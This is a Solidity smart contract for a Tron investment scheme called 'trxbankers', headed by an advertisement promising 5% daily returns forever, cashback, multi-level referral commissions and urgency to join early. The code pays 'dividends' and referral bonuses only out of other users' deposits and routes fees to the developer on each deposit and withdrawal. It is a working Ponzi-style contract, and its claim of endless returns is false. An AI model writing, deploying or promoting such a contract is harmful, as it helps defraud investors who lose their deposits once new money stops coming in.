//SourceUnit: trxbankers3.sol

////////////////////////////////
/////////////////////////////////////
///////////////////////////////////////////
//   TRXBANKERS || 5% DAILY ROI FOREVER////////
//////////////////////////////////////////////////
////////////////////////////////////////////////////////
//🔁🔁First deposit early registration get 10% cashback//
//🔁🔁Join ref link to get 10% cashback///////////////////
//🔁🔁The bigger deposit the bigger  cashback/////////////
/////////////////////////////////////////////////////////             /////////////////////////////////
//➡️ 5% daily lifetime////////////////////////////////                ////////////////////////////////
//➡️ 50 trx min. deposit///////////////////////////                              ////////
//➡️ Verified Perfect Match (no backdoor)///////                                 ////////
//➡️ Withdrawal and Reinvestment at any time./                                   ///////        /////////     //////  //////              //////
//➡️ Unli-Level Referral Commission ////////                                      ///////        /////////  //////       ///////         //////
//   1st lvl - 10%////////////////////////////                                    ///////          ////////////             //////    //////
//   2nd lvl - 3%///////////////////////////////                                  ///////          /////////                   ////////
//   3rd lvl - 2%////////////////////////////////                                 ///////          //////                   ///////////
////////////////////////////////////////////////////                              ///////          //////               //////      /////
//HURRY‼️  BE EARLY‼️////////////////////////////////////                           ///////          //////         ///////               /////
//Visit Telegram group://///////////////////////////////
//For Updates/////////////////////////////////////////////
//https://t.me/trxbankers///////////////////////////////////
/////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////
//Official site: www.trxbankers.com//////////////////////////
////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////
///////////////////////////////////////////////////////
//Developed by: team trxbankers/////////////////////
////////////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////
///////////////////////////////

pragma solidity 0.5.8;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract trxbankers {

        event Upline(address indexed addr, address indexed upline, uint256 bonus);
        event NewDeposit(address indexed addr, uint256 amount);
        event MatchPayout(address indexed addr, address indexed from, uint256 amount);
        event Withdraw(address indexed addr, uint256 amount);



        constructor() public {
        developer = msg.sender;
        maintenance_fee = 1; // % fee to developer
        advertising_fee = 5; // % fee to developer
        infiniteTarif = 5E6;
        min_InfiniteInvest = 50E6;
        max_InfiniteInvest = 1000000E6;
        ref_bonuses.push(10);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
        contract_CreateTime = now;
        contract_TimeToStart = 0;
        RetPercent = 1000;
        contract_StartTime = contract_CreateTime + contract_TimeToStart;
        whaleBalance = 1000000E6;
        infinitePlanDeposit_TimeToStart = 0;
        infinitePlanDeposit_StartTime = contract_CreateTime + infinitePlanDeposit_TimeToStart;
        whaleRetrivePercent = 0;
        min_InfiniteWithdraw = 0;
    }
    modifier onlyDeveloper {
        require(msg.sender == developer);
        _;
    }
    uint256 private infinitePlanDeposit_StartTime;
    uint40 private infinitePlanDeposit_TimeToStart;
    uint40 private infinitePlan_LifeTime;
    uint40 private min_InfiniteInvest;
    uint40 private max_InfiniteInvest;
    uint40 private min_InfiniteWithdraw;
    uint256 private infiniteTarif;
    uint256 private luckyPlanDeposit_StartTime;
    address payable private developer;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint40  private contract_TimeToStart;
    uint8   private defaultWithdrawChances;
    uint256 private invested;
	  uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private direct_bonus;
    uint256 private match_bonus;
    uint256 private maintenance_fee;
    uint256 private advertising_fee;
    uint256 private whaleBalance;
    uint256 private whaleRetrivePercent;
    uint256 private infiniteDepositCount;
    uint256 private luckyDepositCount;
    uint256 private reCount;
    uint256 private RetPercent;
    uint40[] private ref_bonuses;
    mapping(address => Player) private players;
 struct InfinitePlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 dividends;
        uint256 depositsCount;
        uint256 withdrawn;
    }
   struct LuckyPlan {
        uint256 recordDeposit;
        uint256 withdrawn;
    }
    struct Player {
        InfinitePlan[1] infinitePlan;
        LuckyPlan[1] luckyPlan;
        uint8   withdrawChances;
        address upline;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_withdrawn;
        uint256 total_reinvested;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_direct_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        mapping(uint8 => uint256) structure;
    }
    function revokeContract() external {
        uint256 retriveAmountTotal = getRetriveAmountT(msg.sender, RetPercent);
        require(retriveAmountTotal > 0, "Earnings exceed deposited funds");
        uint contractBalance = address(this).balance;
        if (contractBalance > retriveAmountTotal) {
          resetPlayerStatistics(msg.sender);
          totalWithdrawn += retriveAmountTotal;
          totalWithdrawnReferral += getRetriveAmountR(msg.sender);
          reCount++;
          investors++;
          msg.sender.transfer(retriveAmountTotal);
          payOwnerMaintenanceFee(retriveAmountTotal);
        }
    }
   function getRetriveAmountT(address _addr, uint256 rt) private view returns(uint256) {
       return (getRetriveAmountIL(_addr) * rt / 100) + (getRetriveAmountR(_addr));
   }
   function getRetriveAmountIL(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       uint256 a = player.infinitePlan[0].recordDeposit + player.luckyPlan[0].recordDeposit;
       uint256 b = player.infinitePlan[0].withdrawn + player.luckyPlan[0].withdrawn;
       return minZero(a, b);
   }
   function getRetriveAmountR(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       return (player.match_bonus + player.direct_bonus);
   }
    function resetPlayerStatistics(address _addr) private {
        Player storage player = players[_addr];
        player.infinitePlan[0].activeDeposit = 0;
        player.infinitePlan[0].recordDeposit = 0;
        player.infinitePlan[0].dividends = 0;
        player.infinitePlan[0].depositsCount = 0;
        player.infinitePlan[0].withdrawn = 0;
        player.withdrawChances = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.last_payout = now;
        player.total_withdrawn = 0;
        player.total_reinvested = 0;
        player.total_withdrawnReferral = 0;
        player.total_match_bonus = 0;
        player.total_direct_bonus = 0;
        player.total_invested = 0;
        player.firstDep_Time = 0;
        player.upline = address(0);
    }
    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);
            up = players[up].upline;
        }
    }
    function setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != developer) {
             if(players[_upline].infinitePlan[0].activeDeposit == 0) {
                 _upline = developer;
             }
             else {
                 players[_addr].direct_bonus += _amount * 10 / 100;
                 players[_addr].total_direct_bonus += _amount * 10 / 100;
                 direct_bonus += _amount * 10 / 100;
             }
            players[_addr].upline = _upline;
            emit Upline(_addr, _upline, _amount * 10 / 100);
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    function infinitePlanDeposit(address _upline) external payable {
        Player storage player = players[msg.sender];
        require(now >= infinitePlanDeposit_StartTime, "not available yet");
        require(msg.value >= min_InfiniteInvest, "Minimum to invest is 50 TRX");
        require(msg.value <= max_InfiniteInvest, "Maximum to invest is 1 000 000 TRX");
        setUpline(msg.sender, _upline, msg.value);
        if (player.infinitePlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            if (contract_StartTime > now) {
               player.last_payout = contract_StartTime;
            } else {
               player.last_payout = now;
            }
            investors+=1;
            player.withdrawChances = defaultWithdrawChances;
        } else {
            update_InfinitePlanInterestProfit(msg.sender);
        }
        player.infinitePlan[0].depositsCount++;
        infiniteDepositCount ++;
        invested += msg.value;
        player.infinitePlan[0].activeDeposit += msg.value;
        player.infinitePlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        payOwnerAdvertisingFee(msg.value);
        refPayout(msg.sender, msg.value);
        emit NewDeposit(msg.sender, msg.value);
    }
    function update_InfinitePlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getInfinitePlan_InterestProfit(_addr);
        if(amount > 0) {
            player.infinitePlan[0].dividends += amount;
            player.last_payout = now;
        }
    }
    function infinitePlanWithdraw() external {
        Player storage player = players[msg.sender];
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 amount = player.infinitePlan[0].dividends;
        player.infinitePlan[0].dividends = 0;
        player.total_withdrawn += amount;
        player.infinitePlan[0].withdrawn += amount;
        totalWithdrawn += amount;
        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }
    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = address(this).balance;
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(contractBalance >= player.match_bonus + player.direct_bonus, "Contract balance < Referral bonus");
        uint256 amount = player.match_bonus + player.direct_bonus;
        player.match_bonus = 0;
        player.direct_bonus = 0;
        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;
        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }
    function infinitePlanReinvest() external {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, " Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends;
        player.infinitePlan[0].dividends = 0;
        player.infinitePlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }
    function allReinvest() external {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, " Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends + player.match_bonus + player.direct_bonus;
        player.infinitePlan[0].dividends = 0;
        player.match_bonus = 0;
        player.direct_bonus = 0;
        player.infinitePlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }
    function getInfinitePlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now;
        }
        uint256 to = now;
        if(fr < to) {
            value = player.infinitePlan[0].activeDeposit * (to - fr) * infiniteTarif / 86400 / 100E6;
        } else {
            value = 0;
        }
        return value;
    }
    function activeInfiniteInvest(address _addr) external view onlyDeveloper returns(uint256) {
        Player storage player = players[_addr];
        uint256 value = player.infinitePlan[0].activeDeposit;
        return value;
    }
    function payOwnerMaintenanceFee(uint256 val) private {
        uint256 amount_maintenance = (val * maintenance_fee) / 100;
        developer.transfer(amount_maintenance);
    }
    function payOwnerAdvertisingFee(uint256 val) private {
        uint256 amount_advertising = (val * advertising_fee) / 100;
        developer.transfer(amount_advertising);
    }
   function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b;
        } else {
           return 0;
        }
    }
    function userGeneralInfo(address _addr) view external returns(uint256 _totalInvested, uint256 _totalReinvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral,
                                                                  uint256 _totalMatchBonus, uint256 _totalDirectBonus,  uint256 _matchBonus, uint256 _directBonus,
                                                                  uint256 _withdrawChances, uint256 _runningTime, uint256[3] memory _structure) {
        Player storage player = players[_addr];
        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.total_invested,
            player.total_reinvested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.total_direct_bonus,
            player.match_bonus,
            player.direct_bonus,
            player.withdrawChances,
            runningTime,
            _structure
        );
    }
    function userRevokeContractInfo(address _addr) view external returns(uint256 _revokeRetAmountIL, uint256 _revokeRetAmountR, uint256 _revokeRetAmountT) {
        return (
            getRetriveAmountT(_addr, RetPercent) - getRetriveAmountR(_addr),
            getRetriveAmountR(_addr),
            getRetriveAmountT(_addr, RetPercent)
        );
    }
    function userInfinitePlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn) {
        Player storage player = players[_addr];
        return (
            player.infinitePlan[0].activeDeposit,
            player.infinitePlan[0].recordDeposit,
            player.infinitePlan[0].dividends + getInfinitePlan_InterestProfit(_addr),
            player.infinitePlan[0].depositsCount,
            player.infinitePlan[0].withdrawn
        );
    }
    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _matchBonus, uint256 _infiniteDepositCount, uint256 _luckyDepositCount,
                                                  uint256 _contractStartTime, uint256 _contractIniTime, uint256 _infiniteDepIniTime, uint256 _luckyDepIniTime) {
        return (
            invested,
            investors,
            match_bonus,
            infiniteDepositCount,
            luckyDepositCount,
            contract_StartTime,
            minZero(contract_StartTime, now),
            minZero(infinitePlanDeposit_StartTime, now),
            minZero(luckyPlanDeposit_StartTime, now)
        );
    }
}